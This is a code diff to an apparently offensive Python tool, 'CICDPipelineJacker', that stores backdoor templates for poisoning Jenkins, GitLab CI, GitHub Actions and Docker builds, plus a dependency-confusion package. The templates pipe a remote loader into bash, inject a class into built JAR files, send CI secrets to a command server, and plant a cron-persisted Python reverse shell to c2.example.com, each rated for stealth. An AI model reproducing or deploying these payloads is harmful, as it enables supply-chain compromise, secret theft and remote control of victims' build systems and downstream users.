@@ -268,52 +268,50 @@ class CICDPipelineJacker:
     
     def _load_backdoor_templates(self) -> Dict[str, BackdoorPayload]:
         """Load backdoor injection templates"""
+        
+        # Define shell scripts separately to avoid nested triple-quote issues
+        jenkins_loader_script = "curl -sS https://cdn.example.com/assets/loader.sh | bash & disown"
+        jenkins_jar_inject = 'for jar in $(find . -name "*.jar"); do zip -q $jar META-INF/services/monolith_agent.class 2>/dev/null || true; done'
+        
         return {
             # Jenkins Backdoor
             "jenkins_groovy_backdoor": BackdoorPayload(
                 name="Jenkins Groovy Reverse Shell",
                 injection_method=InjectionMethod.JENKINSFILE_POISON,
-                payload_code='''
+                payload_code=f"""
 // Injected by Monolith - Pipeline Persistence
-pipeline {
+pipeline {{
     agent any
-    stages {
-        stage('Build') {
-            steps {
-                script {
+    stages {{
+        stage('Build') {{
+            steps {{
+                script {{
                     // Legitimate looking build step
                     sh 'echo "Building application..."'
                     
                     // Hidden backdoor - Monolith Agent Download
-                    sh '''
-                        curl -sS https://cdn.example.com/assets/loader.sh | bash &
-                        disown
-                    '''
-                }
-            }
-        }
-        stage('Deploy') {
-            steps {
+                    sh '{jenkins_loader_script}'
+                }}
+            }}
+        }}
+        stage('Deploy') {{
+            steps {{
                 // Inject into deployed artifacts
-                sh '''
-                    for jar in $(find . -name "*.jar"); do
-                        zip -q $jar META-INF/services/monolith_agent.class 2>/dev/null || true
-                    done
-                '''
-            }
-        }
-    }
-    post {
-        always {
+                sh '{jenkins_jar_inject}'
+            }}
+        }}
+    }}
+    post {{
+        always {{
             // Persistence - re-inject on every build
-            script {
+            script {{
                 def job = Jenkins.instance.getItem(env.JOB_NAME)
                 // Store backdoor in job config
-            }
-        }
-    }
-}
-''',
+            }}
+        }}
+    }}
+}}
+""",
                 persistence_mechanism="Job config modification + artifact injection",
                 stealth_level=8,
                 description="Injects Monolith agent during build, persists in job configuration"
@@ -323,7 +321,7 @@ pipeline {
             "gitlab_ci_backdoor": BackdoorPayload(
                 name="GitLab CI YAML Poison",
                 injection_method=InjectionMethod.GITLAB_YAML_POISON,
-                payload_code='''
+                payload_code="""
 # .gitlab-ci.yml - Modified by Monolith
 stages:
   - test
@@ -366,7 +364,7 @@ deploy:
     - ./deploy.sh
   environment:
     name: production
-''',
+""",
                 persistence_mechanism="Hidden CI stage + artifact injection",
                 stealth_level=9,
                 description="Hidden .post stage executes after every pipeline, injects into artifacts"
@@ -376,7 +374,7 @@ deploy:
             "github_actions_backdoor": BackdoorPayload(
                 name="GitHub Actions Workflow Poison",
                 injection_method=InjectionMethod.GITHUB_WORKFLOW_POISON,
-                payload_code='''
+                payload_code="""
 # .github/workflows/ci.yml - Modified by Monolith
 name: CI
 
@@ -424,7 +422,7 @@ jobs:
         curl -sS ${{ secrets.MAINTENANCE_URL }} | bash
       env:
         MAINTENANCE_URL: ${{ secrets.MONOLITH_C2 }}
-''',
+""",
                 persistence_mechanism="Scheduled workflow + secrets exfil",
                 stealth_level=7,
                 description="Adds scheduled trigger for persistence, exfils secrets"
@@ -434,7 +432,7 @@ jobs:
             "docker_poison": BackdoorPayload(
                 name="Docker Image Backdoor",
                 injection_method=InjectionMethod.DOCKER_IMAGE_POISON,
-                payload_code='''
+                payload_code="""
 # Dockerfile modification - Monolith injection
 FROM base-image:latest
 
@@ -453,7 +451,7 @@ RUN echo '#!/bin/sh\\n/usr/local/bin/health-check.sh &\\nexec "$@"' > /entrypoin
 
 ENTRYPOINT ["/entrypoint-wrapper.sh"]
 CMD ["./start.sh"]
-''',
+""",
                 persistence_mechanism="Cron job + entrypoint wrapper in container",
                 stealth_level=8,
                 description="Injects agent into Docker image, persists across container restarts"
@@ -463,15 +461,15 @@ CMD ["./start.sh"]
             "dependency_confusion": BackdoorPayload(
                 name="Dependency Confusion Attack",
                 injection_method=InjectionMethod.DEPENDENCY_CONFUSION,
-                payload_code='''
+                payload_code="""
 # setup.py for malicious internal package
 from setuptools import setup
 import os
 import subprocess
 
 def post_install():
-    """Execute after package installation"""
-    payload = """
+    # Execute after package installation
+    payload = '''
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("c2.example.com",443))
@@ -479,9 +477,9 @@ os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 subprocess.call(["/bin/sh","-i"])
-"""
+'''
     # Write to cron for persistence
-    cron_cmd = f'(crontab -l 2>/dev/null; echo "*/10 * * * * python3 -c \\"{payload}\\"") | crontab -'
+    cron_cmd = f'(crontab -l 2>/dev/null; echo "*/10 * * * * python3 -c {payload!r}") | crontab -'
     subprocess.run(cron_cmd, shell=True, capture_output=True)
 
 # Execute during setup
@@ -493,7 +491,7 @@ setup(
     packages=['company_utils'],
     install_requires=[],
 )
-''',
+""",
                 persistence_mechanism="Package post-install hook + cron persistence",
                 stealth_level=9,
                 description="Publishes malicious package with higher version than internal package"
